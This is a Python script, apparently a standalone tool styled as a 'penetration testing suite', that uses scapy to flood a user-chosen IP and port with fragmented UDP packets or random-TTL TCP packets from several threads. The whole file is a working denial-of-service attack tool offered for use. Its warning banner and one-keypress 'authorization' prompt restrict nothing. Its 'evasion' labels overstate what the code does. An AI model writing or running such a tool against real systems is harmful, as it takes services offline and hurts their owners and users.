import os
import sys
import time
import random
import socket
import threading
from scapy.all import *
from datetime import datetime

# Colors for printing
COLORS = {
    "GREEN": "\033[92m",
    "RED": "\033[91m",
    "CYAN": "\033[96m",
    "YELLOW": "\033[93m",
    "BOLD": "\033[1m",
    "RESET": "\033[0m"
}

EVASION_TECHNIQUES = {
    1: "Fragmented Packet Attack",
    2: "TTL Manipulation",
}

# Print warning message
def print_warning():
    os.system("clear")
    warning = f"""
{COLORS['RED']}{COLORS['BOLD']}
##############################################################################
#  WARNING: STRICTLY FOR AUTHORIZED PENETRATION TESTING ONLY!                #
#  UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL. COMPLY WITH ALL LAWS.          #
##############################################################################
{COLORS['RESET']}"""
    print(warning)
    time.sleep(3)

# Display banner
def print_hacker_banner():
    os.system("clear")
    banner = f"""
{COLORS['GREEN']}{COLORS['BOLD']}

 /$$   /$$  /$$$$$$  /$$       /$$$$$$       /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
| $$  /$$/ /$$__  $$| $$      |_  $$_/      | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
| $$ /$$/ | $$  \ $$| $$        | $$        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
| $$$$$/  | $$$$$$$$| $$        | $$        | $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$
| $$  $$  | $$__  $$| $$        | $$        | $$  | $$| $$__  $$| $$  | $$| $$__  $$
| $$\  $$ | $$  | $$| $$        | $$        | $$  | $$| $$  | $$| $$  | $$| $$  | $$
| $$ \  $$| $$  | $$| $$$$$$$$ /$$$$$$      | $$$$$$$/| $$  | $$| $$$$$$$/| $$  | $$
|__/  \__/|__/  |__/|________/|______/      |_______/ |__/  |__/|_______/ |__/  |__/
                                                                                    

{COLORS['RESET']}
{COLORS['CYAN']}Welcome to Kali Dada's Advanced Penetration Testing Suite{COLORS['RESET']}
"""
    print(banner)
    time.sleep(1)

# Validate IP address
def validate_ip(ip):
    try:
        socket.inet_aton(ip)  # Validate if it's a valid IPv4 address
        return True
    except socket.error:
        return False

# Check if server is up or down
def check_server_status(target):
    try:
        socket.setdefaulttimeout(3)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))  # Check if the server responds on port 80 (HTTP)
        s.close()
        return True
    except socket.error:
        return False

# Attack Class: Advanced DoS Attack
class AdvancedDoSAttack:
    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.packet_count = 0
        self.lost_packets = 0
        self.blocked_packets = 0
        self.rate_limit = 1000  # Packets per second
        self.successful_attack = False

    def _fragmented_attack(self):
        # Generate random payload and send fragmented packets
        payload = random.choice([b"GET / HTTP/1.1", b"POST / HTTP/1.1", b"ICMP Echo Request"])
        frags = fragment(IP(dst=self.target)/UDP(dport=self.port)/payload)
        return frags

    def _ttl_evasion(self):
        # Manipulate TTL to random values
        return random.randint(32, 255)

    def _send_packets(self, technique):
        start = time.time()
        while time.time() - start < self.duration:
            try:
                if technique == 1:  # Fragmented Packet Attack
                    send(self._fragmented_attack(), verbose=0)
                elif technique == 2:  # TTL Manipulation
                    pkt = IP(dst=self.target, ttl=self._ttl_evasion())/TCP(dport=self.port)
                    send(pkt, verbose=0)

                self.packet_count += 1
                time.sleep(1/self.rate_limit + random.uniform(-0.001, 0.001))

            except Exception as e:
                # Track lost packets due to errors
                self.lost_packets += 1
                print(f"{COLORS['RED']}Error: {e}{COLORS['RESET']}")

    def _check_firewall_block(self):
        # Simple method to check if firewall blocks packets (by trying to connect)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            if result != 0:
                self.blocked_packets += 1
                return True  # Firewall might be blocking the attack
            sock.close()
        except socket.error:
            pass
        return False

    def start_attack(self, technique, threads=5):
        print(f"{COLORS['YELLOW']}Starting {EVASION_TECHNIQUES[technique]}...{COLORS['RESET']}")
        self.successful_attack = True
        for _ in range(threads):
            threading.Thread(target=self._send_packets, args=(technique,)).start()

    def stop_attack(self):
        print(f"{COLORS['CYAN']}Attack concluded.{COLORS['RESET']}")
        print(f"{COLORS['GREEN']}Total packets sent: {self.packet_count}{COLORS['RESET']}")
        print(f"{COLORS['RED']}Lost packets: {self.lost_packets}{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}Blocked by firewall: {self.blocked_packets}{COLORS['RESET']}")

        # Final status check
        if self._check_firewall_block():
            print(f"{COLORS['RED']}The server is likely blocking your attack via firewall.{COLORS['RESET']}")
        else:
            print(f"{COLORS['GREEN']}Attack was successful!{COLORS['RESET']}")

# Main menu for user input
def main_menu():
    print(f"{COLORS['CYAN']}Select an attack technique:{COLORS['RESET']}")
    for technique in EVASION_TECHNIQUES:
        print(f"{COLORS['CYAN']}{technique}. {EVASION_TECHNIQUES[technique]}{COLORS['RESET']}")
    choice = input(f"{COLORS['YELLOW']}Choose attack type (1 or 2): {COLORS['RESET']}")
    target = input(f"{COLORS['YELLOW']}Enter target IP: {COLORS['RESET']}")
    port = int(input(f"{COLORS['YELLOW']}Enter target port: {COLORS['RESET']}"))
    duration = int(input(f"{COLORS['YELLOW']}Enter attack duration in seconds: {COLORS['RESET']}"))
    return int(choice), target, port, duration

# Authorization check (ensure this is authorized)
def authorization_check():
    confirm = input(f"{COLORS['RED']}Do you have written authorization for this test? (y/N): {COLORS['RESET']}")
    if confirm.lower() != 'y':
        print(f"{COLORS['RED']}Authorization required. Exiting...{COLORS['RESET']}")
        sys.exit(0)

# Main execution flow
if __name__ == "__main__":
    print_warning()
    print_hacker_banner()
    authorization_check()

    if os.geteuid() != 0:
        print(f"{COLORS['RED']}Root privileges required for raw socket operations{COLORS['RESET']}")
        sys.exit(1)

    technique, target, port, duration = main_menu()

    if not validate_ip(target):
        print(f"{COLORS['RED']}Invalid IP address. Please enter a valid IP address.{COLORS['RESET']}")
        sys.exit(1)

    if not check_server_status(target):
        print(f"{COLORS['RED']}Server is down or unreachable. Cannot continue the attack.{COLORS['RESET']}")
        sys.exit(1)

    dos_attack = AdvancedDoSAttack(target, port, duration)

    try:
        dos_attack.start_attack(technique)
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        dos_attack.stop_attack()
